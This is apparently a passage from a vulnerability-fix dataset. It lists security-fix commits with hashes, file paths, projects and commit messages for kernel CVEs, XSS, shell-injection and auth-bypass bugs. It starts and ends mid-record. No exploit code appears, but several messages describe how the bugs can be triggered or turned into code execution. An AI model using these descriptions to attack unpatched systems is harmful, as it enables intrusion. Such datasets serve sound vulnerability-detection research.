[ 1317.270230] Code: 00 8b 45 cc 48 8d 75 d0 48 c7 45 d8 00 00 00 00 66 c7 45 d0 02 00 89 45 d4 48 89 df e8 78 49 76 ff 41 89 c4 85 c0 75 0c 48 8b 03 <80> b8 74 09 00 00 01 7 4 06 41 bc 9d ff ff ff f6 05 2a b6 c2 02 [ 1317.270230] RIP  [<ffffffff84225f52>] rds_ib_laddr_check+0x82/0x110 [ 1317.270230]  RSP <ffff8803cd31bdf8> [ 1317.270230] CR2: 0000000000000974\n\nSigned-off-by: Sasha Levin <sasha.levin@oracle.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    017f8c2a0865ab31e01d591adc43d34f2dd60e59
File(s) In Commit: 
    lib/as/Flowplayer.as
Blob(s) In Commit: 
    d9625ba3aaaa31ee1005cf7d9de6b9244d7d40f3
Blob(s) Before Fix: 
    e0f53b6e2cf3f145741bde69beb42bed43a03a4f
Projects:
    1974kpkpkp_flowplayer
Commit Message for 017f8c2a0865ab31e01d591adc43d34f2dd60e59:
Merge pull request #382 from flowplayer/bug/381\n\ndon't accept callback to be passed in the query string (#381)

======================================================================
Commit With Fix: 
    27e8f178276c185cbddb4f14c91d4ce7b3865db1
File(s) In Commit: 
    lib/as/Flowplayer.as
Blob(s) In Commit: 
    2eeab4d923f2105fd5441acce42c7260de88e998
Blob(s) Before Fix: 
    b5ea3240861927b4bca9e97fb72e6aa2d5622f9e
Projects:
    1974kpkpkp_flowplayer
Commit Message for 27e8f178276c185cbddb4f14c91d4ce7b3865db1:
Merge pull request #578 from flowplayer/bug/381\n\nDecode the URL before checking the callback param.

======================================================================
Commit With Fix: 
    ef2329cf71acb59204dd981e2c6cce6c81fe467c
File(s) In Commit: 
    magic/Magdir/commands
Blob(s) In Commit: 
    4a7d8ddb0bf3fc40b5f9dc5af463c4ea210db87e
Blob(s) Before Fix: 
    67c3eee2eba6eaa9a06cd2af32b8587e9803036b
    7874de7e2c4db1a319a2da8d815d251e03158df3
Projects:
    5hadowblad3_file
Commit Message for ef2329cf71acb59204dd981e2c6cce6c81fe467c:
limit to 100 repetitions to avoid excessive backtracking Carsten Wolff

======================================================================
Commit With Fix: 
    d558023207e008a4476a3b7bb8706b2a2bf5d84f
File(s) In Commit: 
    fs/aio.c
Blob(s) In Commit: 
    63135331cec27b3801375835165726077f61cc35
Blob(s) Before Fix: 
    ee77dc13d5b22370899ed96e12be13e26a4aaad3
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for d558023207e008a4476a3b7bb8706b2a2bf5d84f:
aio: prevent double free in ioctx_alloc\n\nioctx_alloc() calls aio_setup_ring() to allocate a ring. If aio_setup_ring() fails to do so it would call aio_free_ring() before returning, but ioctx_alloc() would call aio_free_ring() again causing a double free of the ring.\n\nThis is easily reproducible from userspace.\n\nSigned-off-by: Sasha Levin <sasha.levin@oracle.com> Signed-off-by: Benjamin LaHaise <bcrl@kvack.org>

======================================================================
Commit With Fix: 
    53da201749f8f362323ef278bf338f1d9f7a925a
File(s) In Commit: 
    index.php
Blob(s) In Commit: 
    884b2afd9529a55ee98fba6044c32d6f7314b9b2
Blob(s) Before Fix: 
    0465a4e5bbca798b5dc1b0ca0cd26a0801450b14
Projects:
    ArthurHoaro_Shaarli
Commit Message for 53da201749f8f362323ef278bf338f1d9f7a925a:
XSS flaw correction\n\nCloses issue https://github.com/sebsauvage/Shaarli/issues/134

======================================================================
Commit With Fix: 
    9e427d524e04a905312a3294c85e939ed7d57b8c
File(s) In Commit: 
    lib/api.js
Blob(s) In Commit: 
    b56578e7417c2944227b17b7945e273d56e03cc9
Blob(s) Before Fix: 
    ea0c86f90e1075b135611802bcbfa4b89daa9363
Projects:
    leizongmin_tomato
Commit Message for 9e427d524e04a905312a3294c85e939ed7d57b8c:
API服务器，检查 config.api.access_key 的类型，避免因误将其设置为字符串时导致验证被绕过

======================================================================
Commit With Fix: 
    dfe7801d73a0dda10663a0ff3d0ec8b4d5f0d448
File(s) In Commit: 
    lib/libnotify.js
Blob(s) In Commit: 
    7e59267d70b1ada34fc72b84a01dafede1a21f08
Blob(s) Before Fix: 
    2c1567b7fb0e1101f40434e5ba3eb0a7549bb934
Projects:
    mytrile_node-libnotify
Commit Message for dfe7801d73a0dda10663a0ff3d0ec8b4d5f0d448:
Merge pull request #4 from nealpoole/exec-fix\n\nReplacing call to exec with execFile.

======================================================================
Commit With Fix: 
    2817869f98c54975f31e2dd674c1aefa70749cca
File(s) In Commit: 
    canto_curses/guibase.py
Blob(s) In Commit: 
    a67fc7dd52c039fbd3a0016203a393d018ac2ea1
Blob(s) Before Fix: 
    c23a2ecf5b21b9583eb6e0d5c8a1069d8de9b3c5
Projects:
    stpx_canto-curses
Commit Message for 2817869f98c54975f31e2dd674c1aefa70749cca:
Proper URL quoting to avoid shell injection

======================================================================
Commit With Fix: 
    ad941faddead705cd611921730054767a0b32dcd
File(s) In Commit: 
    include/webutil.js
Blob(s) In Commit: 
    5ceccbefd33bc919024c1b74303fe874248078ef
Blob(s) Before Fix: 
    6722fe3863ba68dbbaae9e6857afcbf53a3a77cc
    bdf55467b84d9d1f02eacce6c6f278f042db9f00
    ebf8e8918139b5dea0adc0499ebf87fc19ce72b4
Projects:
    0-complexity_noVNC
Commit Message for ad941faddead705cd611921730054767a0b32dcd:
Adds support for secure attribute on token cookie\n\nThis patch adds support for the secure attribute on token cookies (sent by nova-novncproxy). If the https is used to transfer the cookie, the secure attribute is set thus restricting server requestes to secure conections only. This should prevent man-in-the-middle attacks.

======================================================================
Commit With Fix: 
    741495cb08503fd32a9d22648e63b64390c601f4
File(s) In Commit: 
    nbd-server.c
Blob(s) In Commit: 
    bfc6790e9caa2c02a09a2c231648f2a2e5d1f6f3
Blob(s) Before Fix: 
    392ed9f3799e350c5216f6c655285879fcd53c5e
Projects:
    363921219_nbd
Commit Message for 741495cb08503fd32a9d22648e63b64390c601f4:
nbd-server: handle modern-style negotiation in a child process\n\nPreviously, the modern style negotiation was carried out in the root server (listener) process before forking the actual client handler. This made it possible for a malfunctioning or evil client to terminate the root process simply by querying a non-existent export or aborting in the middle of the negotation process (caused SIGPIPE in the server).\n\nThis commit moves the negotiation process to the child to keep the root process up and running no matter what happens during the negotiation.\n\nSee http://sourceforge.net/mailarchive/message.php?msg_id=30410146\n\nSigned-off-by: Tuomas Räsänen <tuomasjjrasanen@tjjr.fi>

======================================================================
Commit With Fix: 
    dc2966bd05b69321300c63fd0bd78e7c78ecea6e
File(s) In Commit: 
    includes/specials/SpecialContributions.php
Blob(s) In Commit: 
    614bd3ec419f2f250154e443376a97efb99b84cb
Blob(s) Before Fix: 
    7a3e7c80d11fefa639596f5b5ce3a718b0c8a701
Projects:
    0x047d_mediawiki
Commit Message for dc2966bd05b69321300c63fd0bd78e7c78ecea6e:
Prevent Special:Contributions from indicating that an IP address is autoblocked\n\nIf an IP address was autoblocked in the userlinks, sysops would see "change block" and "unblock", indicating that the IP is autoblocked.\n\nNow Special:Contributions will only display "change block" if the user is blocked and the block type is not Block::TYPE_AUTO. This is the same check which is used above when deciding whether to display the block log extract.\n\nBug: 46457 Change-Id: I43047059cb67527d5296322ac17fe798db917bec

======================================================================
Commit With Fix: 
    2def2ef2ae5f3990aabdbe8a755911902707d268
File(s) In Commit: 
    net/compat.c
Blob(s) In Commit: 
    f50161fb812eace2eb659ae78bf12062c608b5b6
Blob(s) Before Fix: 
    275af79c131bf62cbfee3c63dd2143983497c241
    53e933eb78b8b2e4269317ea2176210c2ac3fe3e
    618c6a8a911b65c9a406ba5d7d0e221cb124960e
    6def90e0a1124b6772c480d099e7f6a505ba82f8
    79ae884850015a99a1e43c4b2fc228670c3779b9
    89032580bd1d8aa5ef29d1395661bdd0bcfe95f1
    8c979cccdbd94f16c27f7bc98123152e803641d1
    bb1ac8a0aab99cfa6a4e16a35d9015f0f24c49dc
    c578d9382e193db92a3b5a5511d62303be4df7c5
    cbc1a2a265876277848f0a697040cea3db75b7d7
    d12529050b291e9951cc03881d46b723f98363d0
    dae891cfdbf74e1a275bf94b4e8d925ceb940366
    dd32e34c1e2c9481aa2db3c37437ef0d85ba5277
    e055708b8ec9dfaa894e8e5920b4c35fd38b2afe
    f0a1ba6c8086acc65a87e519fca48853a3bd091e
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 2def2ef2ae5f3990aabdbe8a755911902707d268:
x86, x32: Correct invalid use of user timespec in the kernel\n\nThe x32 case for the recvmsg() timout handling is broken:\n\n  asmlinkage long compat_sys_recvmmsg(int fd, struct compat_mmsghdr __user *mmsg,                                       unsigned int vlen, unsigned int flags,                                       struct compat_timespec __user *timeout)   {           int datagrams            struct timespec ktspec \n\n          if (flags & MSG_CMSG_COMPAT)                   return -EINVAL \n\n          if (COMPAT_USE_64BIT_TIME)                   return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,                                         flags | MSG_CMSG_COMPAT,                                         (struct timespec *) timeout)            ...\n\nThe timeout pointer parameter is provided by userland (hence the __user annotation) but for x32 syscalls it's simply cast to a kernel pointer and is passed to __sys_recvmmsg which will eventually directly dereference it for both reading and writing.  Other callers to __sys_recvmmsg properly copy from userland to the kernel first.\n\nThe bug was introduced by commit ee4fa23c4bfc ("compat: Use COMPAT_USE_64BIT_TIME in net/compat.c") and should affect all kernels since 3.4 (and perhaps vendor kernels if they backported x32 support along with this code).\n\nNote that CONFIG_X86_X32_ABI gets enabled at build time and only if CONFIG_X86_X32 is enabled and ld can build x32 executables.\n\nOther uses of COMPAT_USE_64BIT_TIME seem fine.\n\nThis addresses CVE-2014-0038.\n\nSigned-off-by: PaX Team <pageexec@freemail.hu> Signed-off-by: H. Peter Anvin <hpa@linux.intel.com> Cc: <stable@vger.kernel.org> # v3.4+ Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    a08d3b3b99efd509133946056531cdf8f3a0c09b
File(s) In Commit: 
    arch/x86/kvm/x86.c
Blob(s) In Commit: 
    2b8578432d5bccd296fa6d5859e3575c0fe4aa02
Blob(s) Before Fix: 
    094b5d96ab1468c1875a2a2a5e682245f2909db9
    0c76f7cfdb32c0f9161ea08427f9144d332eaca5
    21ef1ba184ae8500a70061f566ea55fde76cbfd2
    32c984a80812b1069d2bcc06b7c3593be8bf2868
    39c28f09dfd5f03ca064be4bb5cfa01eb0d673a4
    4e33b8508252edf8d4fdda40630ecb0947b3d637
    5d004da1e35da9bdad0260f5d6b0f287330b194c
    84a28ea45fa494b76fd89cf1d9698cd8c4b14d9f
    9cbfc06981186d96c42d3383122310018fea0d7d
    d21bce5053155535f51d1507f7f38306023eb994
    e1721324c271e18430f43ee226a367c4495d18ab
    e28fb97a1a885580830c309ee6f31404c2bf985c
    e5ca72a5cdb6da13617033ad8c0c65c4391d9e2f
    e8ba99c341808d6069b0b4f6985b8d71ef243971
    eb9b9c9fc3d962c83d23f14486759264eda08556
    f71500af1f813245bb12092665ac7dea3ba5f24f
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a08d3b3b99efd509133946056531cdf8f3a0c09b:
kvm: x86: fix emulator buffer overflow (CVE-2014-0049)\n\nThe problem occurs when the guest performs a pusha with the stack address pointing to an mmio address (or an invalid guest physical address) to start with, but then extending into an ordinary guest physical address.  When doing repeated emulated pushes emulator_read_write sets mmio_needed to 1 on the first one.  On a later push when the stack points to regular memory, mmio_nr_fragments is set to 0, but mmio_is_needed is not set to 0.\n\nAs a result, KVM exits to userspace, and then returns to complete_emulated_mmio.  In complete_emulated_mmio vcpu->mmio_cur_fragment is incremented.  The termination condition of vcpu->mmio_cur_fragment == vcpu->mmio_nr_fragments is never achieved. The code bounces back and fourth to userspace incrementing mmio_cur_fragment past it's buffer.  If the guest does nothing else it eventually leads to a a crash on a memcpy from invalid memory address.\n\nHowever if a guest code can cause the vm to be destroyed in another vcpu with excellent timing, then kvm_clear_async_pf_completion_queue can be used by the guest to control the data that's pointed to by the call to cancel_work_item, which can be used to gain execution.\n\nFixes: f78146b0f9230765c6315b2e14f56112513389ad Signed-off-by: Andrew Honig <ahonig@google.com> Cc: stable@vger.kernel.org (3.5+) Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    5d81de8e8667da7135d3a32a964087c0faf5483f
File(s) In Commit: 
    fs/cifs/file.c
Blob(s) In Commit: 
    18758bcd4dab47d7b7d4c0fd8d6465cf78128048
Blob(s) Before Fix: 
    290b4966004f6e7d1c32fa17c67ea80beeba6679
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 5d81de8e8667da7135d3a32a964087c0faf5483f:
cifs: ensure that uncached writes handle unmapped areas correctly\n\nIt's possible for userland to pass down an iovec via writev() that has a bogus user pointer in it. If that happens and we're doing an uncached write, then we can end up getting less bytes than we expect from the call to iov_iter_copy_from_user. This is CVE-2014-0069\n\ncifs_iovec_write isn't set up to handle that situation however. It'll blindly keep chugging through the page array and not filling those pages with anything useful. Worse yet, we'll later end up with a negative number in wdata->tailsz, which will confuse the sending routines and cause an oops at the very least.\n\nFix this by having the copy phase of cifs_iovec_write stop copying data in this situation and send the last write as a short one. At the same time, we want to avoid sending a zero-length write to the server, so break out of the loop and set rc to -EFAULT if that happens. This also allows us to handle the case where no address in the iovec is valid.\n\n[Note: Marking this for stable on v3.4+ kernels, but kernels as old as        v2.6.38 may have a similar problem and may need similar fix]\n\nCc: <stable@vger.kernel.org> # v3.4+ Reviewed-by: Pavel Shilovsky <piastry@etersoft.ru> Reported-by: Al Viro <viro@zeniv.linux.org.uk> Signed-off-by: Jeff Layton <jlayton@redhat.com> Signed-off-by: Steve French <smfrench@gmail.com>

======================================================================
Commit With Fix: 
    a1d6fc07e8a40c1b2b16f4103c403b30e1089668
File(s) In Commit: 
    src/ios/CDVFileTransfer.m
Blob(s) In Commit: 
    c5c75028c222d3314a0e3c87ec251de635ad636e
Blob(s) Before Fix: 
    e35e2fe7c4961e3aeee5d71d4df87181f27be55d
Projects:
    471685249_cordova-plugin-file-transfer
Commit Message for a1d6fc07e8a40c1b2b16f4103c403b30e1089668:
Fix default value for trustAllHosts on iOS (YES->NO)

======================================================================
Commit With Fix: 
    d8316f3991d207fe32881a9ac20241be8fa2bad0
File(s) In Commit: 
    drivers/vhost/net.c
Blob(s) In Commit: 
    026be580d318481f6ed3732dd06b6fb2ea2c5160
Blob(s) Before Fix: 
    a0fa5de210cf57ac6842625ceb21499ac07a7969
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for d8316f3991d207fe32881a9ac20241be8fa2bad0:
vhost: fix total length when packets are too short\n\nWhen mergeable buffers are disabled, and the incoming packet is too large for the rx buffer, get_rx_bufs returns success.\n\nThis was intentional in order for make recvmsg truncate the packet and then handle_rx would detect err != sock_len and drop it.\n\nUnfortunately we pass the original sock_len to recvmsg - which means we use parts of iov not fully validated.\n\nFix this up by detecting this overrun and doing packet drop immediately.\n\nCVE-2014-0077\n\nSigned-off-by: Michael S. Tsirkin <mst@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    b412ca05f6b430eaa1ce97ac95885b4cf187b04a
File(s) In Commit: 
    lib/net/ldap/password.rb
Blob(s) In Commit: 
    729e17e31b4163c7d96c715ba8455ad924f19238
Blob(s) Before Fix: 
    3669dfccfa5fe6950326a5ba3ed5bce50398d8d0
Projects:
    0xCCD_ruby-net-ldap
Commit Message for b412ca05f6b430eaa1ce97ac95885b4cf187b04a:
Use SecureRandam to generate salt

======================================================================
Commit With Fix: 
    8131f15003f5bec73d475d2b724472e4b87d0757
File(s) In Commit: 
    impl/src/main/java/org/richfaces/webapp/PushHandlerFilter.java
Blob(s) In Commit: 
    8b88e3b652ca5c1ff071d9249d930db19d05f808
Blob(s) Before Fix: 
    256ab26b0ef48df83c4460708bced80133dd766e
Projects:
    Alvise88_richfaces
Commit Message for 8131f15003f5bec73d475d2b724472e4b87d0757:
RF-13250: applying patch

======================================================================
Commit With Fix: 
    ec0223ec48a90cb605244b45f7c62de856403729
File(s) In Commit: 
    net/sctp/sm_statefuns.c
Blob(s) In Commit: 
    ae65b6b5973a9bceca7825037317f9fc9f39e2db
Blob(s) Before Fix: 
    483dcd71b3c5f76a17dc66aee156c0b6caf60bac
    5131fcfedb03c0b09e8c7e451341cebd82e49692
    591b44d3b7de6bb39faa994cddc72851422ec08f
    a26065be728901ed3c7e35690bafc51deabab115
    dfe3f36ff2aa27165b35a39d382583759cd3ebae
    f6b7109195a629563b7a49a06e32847fd3b23984
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for ec0223ec48a90cb605244b45f7c62de856403729:
net: sctp: fix sctp_sf_do_5_1D_ce to verify if we/peer is AUTH capable\n\nRFC4895 introduced AUTH chunks for SCTP  during the SCTP handshake RANDOM  CHUNKS  HMAC-ALGO are negotiated (CHUNKS being optional though):\n\n  ---------- INIT[RANDOM  CHUNKS  HMAC-ALGO] ---------->   <------- INIT-ACK[RANDOM  CHUNKS  HMAC-ALGO] ---------   -------------------- COOKIE-ECHO -------------------->   <-------------------- COOKIE-ACK ---------------------\n\nA special case is when an endpoint requires COOKIE-ECHO chunks to be authenticated:\n\n  ---------- INIT[RANDOM  CHUNKS  HMAC-ALGO] ---------->   <------- INIT-ACK[RANDOM  CHUNKS  HMAC-ALGO] ---------   ------------------ AUTH  COOKIE-ECHO ---------------->   <-------------------- COOKIE-ACK ---------------------\n\nRFC4895, section 6.3. Receiving Authenticated Chunks says:\n\n  The receiver MUST use the HMAC algorithm indicated in   the HMAC Identifier field. If this algorithm was not   specified by the receiver in the HMAC-ALGO parameter in   the INIT or INIT-ACK chunk during association setup, the   AUTH chunk and all the chunks after it MUST be discarded   and an ERROR chunk SHOULD be sent with the error cause   defined in Section 4.1. [...] If no endpoint pair shared   key has been configured for that Shared Key Identifier,   all authenticated chunks MUST be silently discarded. [...]\n\n  When an endpoint requires COOKIE-ECHO chunks to be   authenticated, some special procedures have to be followed   because the reception of a COOKIE-ECHO chunk might result   in the creation of an SCTP association. If a packet arrives   containing an AUTH chunk as a first chunk, a COOKIE-ECHO   chunk as the second chunk, and possibly more chunks after   them, and the receiver does not have an STCB for that   packet, then authentication is based on the contents of   the COOKIE-ECHO chunk. In this situation, the receiver MUST   authenticate the chunks in the packet by using the RANDOM   parameters, CHUNKS parameters and HMAC_ALGO parameters   obtained from the COOKIE-ECHO chunk, and possibly a local   shared secret as inputs to the authentication procedure   specified in Section 6.3. If authentication fails, then   the packet is discarded. If the authentication is successful,   the COOKIE-ECHO and all the chunks after the COOKIE-ECHO   MUST be processed. If the receiver has an STCB, it MUST   process the AUTH chunk as described above using the STCB   from the existing association to authenticate the   COOKIE-ECHO chunk and all the chunks after it. [...]\n\nCommit bbd0d59809f9 introduced the possibility to receive and verification of AUTH chunk, including the edge case for authenticated COOKIE-ECHO. On reception of COOKIE-ECHO, the function sctp_sf_do_5_1D_ce() handles processing, unpacks and creates a new association if it passed sanity checks and also tests for authentication chunks being present. After a new association has been processed, it invokes sctp_process_init() on the new association and walks through the parameter list it received from the INIT chunk. It checks SCTP_PARAM_RANDOM, SCTP_PARAM_HMAC_ALGO and SCTP_PARAM_CHUNKS, and copies them into asoc->peer meta data (peer_random, peer_hmacs, peer_chunks) in case sysctl -w net.sctp.auth_enable=1 is set. If in INIT's SCTP_PARAM_SUPPORTED_EXT parameter SCTP_CID_AUTH is set, peer_random != NULL and peer_hmacs != NULL the peer is to be assumed asoc->peer.auth_capable=1, in any other case asoc->peer.auth_capable=0.\n\nNow, if in sctp_sf_do_5_1D_ce() chunk->auth_chunk is available, we set up a fake auth chunk and pass that on to sctp_sf_authenticate(), which at latest in sctp_auth_calculate_hmac() reliably dereferences a NULL pointer at position 0..0008 when setting up the crypto key in crypto_hash_setkey() by using asoc->asoc_shared_key that is NULL as condition key_id == asoc->active_key_id is true if the AUTH chunk was injected correctly from remote. This happens no matter what net.sctp.auth_enable sysctl says.\n\nThe fix is to check for net->sctp.auth_enable and for asoc->peer.auth_capable before doing any operations like sctp_sf_authenticate() as no key is activated in sctp_auth_asoc_init_active_key() for each case.\n\nNow as RFC4895 section 6.3 states that if the used HMAC-ALGO passed from the INIT chunk was not used in the AUTH chunk, we SHOULD send an error  however in this case it would be better to just silently discard such a maliciously prepared handshake as we didn't even receive a parameter at all. Also, as our endpoint has no shared key configured, section 6.3 says that MUST silently discard, which we are doing from now onwards.\n\nBefore calling sctp_sf_pdiscard(), we need not only to free the association, but also the chunk->auth_chunk skb, as commit bbd0d59809f9 created a skb clone in that case.\n\nI have tested this locally by using netfilter's nfqueue and re-injecting packets into the local stack after maliciously modifying the INIT chunk (removing RANDOM  HMAC-ALGO param) and the SCTP packet containing the COOKIE_ECHO (injecting AUTH chunk before COOKIE_ECHO). Fixed with this patch applied.\n\nFixes: bbd0d59809f9 ("[SCTP]: Implement the receive and verification of AUTH chunk") Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Cc: Vlad Yasevich <yasevich@gmail.com> Cc: Neil Horman <nhorman@tuxdriver.com> Acked-by: Vlad Yasevich <vyasevich@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    1fd819ecb90cc9b822cd84d3056ddba315d3340f
File(s) In Commit: 
    net/core/skbuff.c
Blob(s) In Commit: 
    869c7afe3b070576464693e4d6ca00482c151f42
Blob(s) Before Fix: 
    06e72d3cdf60dbd96a3ad4829cfcc2baec0a80e8
    0b5149c5bc4a14ca7ac559ab166961dacd2f1eec
    1c1738cc4538c142bcf8d3a7ec8a534204a68d91
    20e02d2605ecb2f10f5f74ab6f00cbd8fb852615
    2718fed53d8cf5b81a06c82f8cdf8ed96632185a
    5976ef0846bdda08db6289bb91f05a63b85e6e3a
    5d6236d9fdce41eeea2e41433e8f51803b2be68a
    8cec1e6b844df666b563429f538adf7695a527b6
    af9185d0be6a9e3b3b81c10d061b82992c40fc1d
    d81cff119f734a5c8f405fed01f4047b9169f5d1
    dc4f7683ff52710d2707866a4f5879280ae2bd67
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 1fd819ecb90cc9b822cd84d3056ddba315d3340f:
skbuff: skb_segment: orphan frags before copying\n\nskb_segment copies frags around, so we need to copy them carefully to avoid accessing user memory after reporting completion to userspace through a callback.\n\nskb_segment doesn't normally happen on datapath: TSO needs to be disabled - so disabling zero copy in this case does not look like a big deal.\n\nSigned-off-by: Michael S. Tsirkin <mst@redhat.com> Acked-by: Herbert Xu <herbert@gondor.apana.org.au> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    4291086b1f081b869c6d79e5b7441633dc3ace00
File(s) In Commit: 
    drivers/tty/n_tty.c
Blob(s) In Commit: 
    fe9d129c87351b47392320a626dedb89e2f0bf55
Blob(s) Before Fix: 
    05e72bea9b07d87e31c69e291844428cb642d4be
    19083efa2314660b25e0fb5bc793af6fb7e9af57
    2470b918aa2c7dfe9f6e6200aed54e5a85425ff9
    34aacaaae14ab9b595ea41744504c2cbc65b9ff3
    41fe8a047d373cf84b14a9a2f5d8f41e07fd3b5f
    4bf0fc0843d73bc61cd99d0cc5898177fe0dc39c
    4c10837898849f2c626b9bb44d1c6299a793f837
    6c7fe90ad72d48d2834536331e6826ee2719f94f
    8c0b7b42319c44d7038892d0026582797acad95a
    cb8017aa443472f8b67d9ec4eab7403b268d2c0f
    d15624c1b75161877e6319e6460981866feb54cb
    e36d1f5ca191b34c396e3152276b39eaa89b80bd
    ee1c268f5f9d6582da5b0eeb5121ada945fcd800
Projects:
    0-T-0_ps4-linux
Commit Message for 4291086b1f081b869c6d79e5b7441633dc3ace00:
n_tty: Fix n_tty_write crash when echoing in raw mode\n\nThe tty atomic_write_lock does not provide an exclusion guarantee for the tty driver if the termios settings are LECHO & !OPOST.  And since it is unexpected and not allowed to call TTY buffer helpers like tty_insert_flip_string concurrently, this may lead to crashes when concurrect writers call pty_write. In that case the following two writers: * the ECHOing from a workqueue and * pty_write from the process race and can overflow the corresponding TTY buffer like follows.\n\nIf we look into tty_insert_flip_string_fixed_flag, there is:   int space = __tty_buffer_request_room(port, goal, flags)    struct tty_buffer *tb = port->buf.tail    ...   memcpy(char_buf_ptr(tb, tb->used), chars, space)    ...   tb->used += space \n\nso the race of the two can result in something like this:               A                                B __tty_buffer_request_room                                   __tty_buffer_request_room memcpy(buf(tb->used), ...) tb->used += space                                    memcpy(buf(tb->used), ...) ->BOOM\n\nB's memcpy is past the tty_buffer due to the previous A's tb->used increment.\n\nSince the N_TTY line discipline input processing can output concurrently with a tty write, obtain the N_TTY ldisc output_lock to serialize echo output with normal tty writes.  This ensures the tty buffer helper tty_insert_flip_string is not called concurrently and everything is fine.\n\nNote that this is nicely reproducible by an ordinary user using forkpty and some setup around that (raw termios + ECHO). And it is present in kernels at least after commit d945cb9cce20ac7143c2de8d88b187f62db99bdc (pty: Rework the pty layer to use the normal buffering logic) in 2.6.31-rc3.\n\njs: add more info to the commit log js: switch to bool js: lock unconditionally js: lock only the tty->ops->write call\n\nReferences: CVE-2014-0196 Reported-and-tested-by: Jiri Slaby <jslaby@suse.cz> Signed-off-by: Peter Hurley <peter@hurleysoftware.com> Signed-off-by: Jiri Slaby <jslaby@suse.cz> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Alan Cox <alan@lxorguk.ukuu.org.uk> Cc: <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    7ada876a8703f23befbb20a7465a702ee39b1704
File(s) In Commit: 
    kernel/futex.c
Blob(s) In Commit: 
    e328f574c97c02797d7ff06c5cb5862f9368ce4a
Blob(s) Before Fix: 
    251a1d5c715c285c3b90a47704eb7732c98e33be
    257db2460ab81542d61ba67443de70e0771c2c50
    3761dacd3e9192d6b8d7192f3dbea7f5552c9175
    6a3a5fa1526d87d16b362e20d7d62e6809285c18
    ba7f0be175319cfdd1dba8cf8482ba4107beda15
    e7a35f1039e785464b318d3713557e9d2db6a591
    fb65e822fc41ae698c282aeadc6933b411aa8a78
    fe28dc282eae43af920d2937e8f9c5dc631ffa43
Projects:
    0-T-0_ps4-linux
    007shadowfighter_rails
    0day-ci_xen
Commit Message for 7ada876a8703f23befbb20a7465a702ee39b1704:
futex: Fix errors in nested key ref-counting\n\nfutex_wait() is leaking key references due to futex_wait_setup() acquiring an additional reference via the queue_lock() routine. The nested key ref-counting has been masking bugs and complicating code analysis. queue_lock() is only called with a previously ref-counted key, so remove the additional ref-counting from the queue_(un)lock() functions.\n\nAlso futex_wait_requeue_pi() drops one key reference too many in unqueue_me_pi(). Remove the key reference handling from unqueue_me_pi(). This was paired with a queue_lock() in futex_lock_pi(), so the count remains unchanged.\n\nDocument remaining nested key ref-counting sites.\n\nSigned-off-by: Darren Hart <dvhart@linux.intel.com> Reported-and-tested-by: Matthieu Fertré<matthieu.fertre@kerlabs.com> Reported-by: Louis Rilling<louis.rilling@kerlabs.com> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Eric Dumazet <eric.dumazet@gmail.com> Cc: John Kacur <jkacur@redhat.com> Cc: Rusty Russell <rusty@rustcorp.com.au> LKML-Reference: <4CBB17A8.70401@linux.intel.com> Signed-off-by: Thomas Gleixner <tglx@linutronix.de> Cc: stable@kernel.org

======================================================================
Commit With Fix: 
    edfbbf388f293d70bf4b7c0bc38774d05e6f711a
File(s) In Commit: 
    fs/aio.c
Blob(s) In Commit: 
    955947ef3e0263590b64162f5888b81822196415
Blob(s) Before Fix: 
    062a5f6a1448c6cff1cd1dc09e84db3f0d59cc27
    067e3d340c353e614787fe5dbdb205dedb7b9ec4
    12a3de0ee6dacbdea873ec9ea28bdd88d1ea999d
    3f941f2a305949f31ba9dce2a4e87f6849e8ab71
    4f078c054b41608fe3a8ed325c55d59898b049cb
    6a9c7e489adff02661e1c9b016423248fb6b9076
    873b4ca82ccbcde4c108a2592fbd7f46b88273a0
    9b5ca113741948d95330d866e8e4e2cce113f3e5
    a0ed6c7d2cd2a3e91a5d12e48af705d75afe315a
Projects:
    0-T-0_ps4-linux
Commit Message for edfbbf388f293d70bf4b7c0bc38774d05e6f711a:
aio: fix kernel memory disclosure in io_getevents() introduced in v3.10\n\nA kernel memory disclosure was introduced in aio_read_events_ring() in v3.10 by commit a31ad380bed817aa25f8830ad23e1a0480fef797.  The changes made to aio_read_events_ring() failed to correctly limit the index into ctx->ring_pages[], allowing an attacked to cause the subsequent kmap() of an arbitrary page with a copy_to_user() to copy the contents into userspace. This vulnerability has been assigned CVE-2014-0206.  Thanks to Mateusz and Petr for disclosing this issue.\n\nThis patch applies to v3.12+.  A separate backport is needed for 3.10/3.11.\n\nSigned-off-by: Benjamin LaHaise <bcrl@kvack.org> Cc: Mateusz Guzik <mguzik@redhat.com> Cc: Petr Matousek <pmatouse@redhat.com> Cc: Kent Overstreet <kmo@daterainc.com> Cc: Jeff Moyer <jmoyer@redhat.com> Cc: stable@vger.kernel.org

======================================================================
Commit With Fix: 
    b8acc83781d5a24cc5101e525d15efe0482c280d
File(s) In Commit: 
    src/cdf.c
Blob(s) In Commit: 
    c591a14a9f9e7e2accfc2a0ebeb19d319e3570e6
Blob(s) Before Fix: 
    5ae96acaeef64e36889bee33449d1dbde8ae23a8
    f7c46aedb59b75adfc67e29476e6c104315215ab
Projects:
    5hadowblad3_file
Commit Message for b8acc83781d5a24cc5101e525d15efe0482c280d:
Remove loop that kept reading the same offset (Jan Kaluza)

======================================================================
Commit With Fix: 
    f97486ef5dc3e8735440edc4fc8808c63e1a3ef0
File(s) In Commit: 
    src/cdf.c
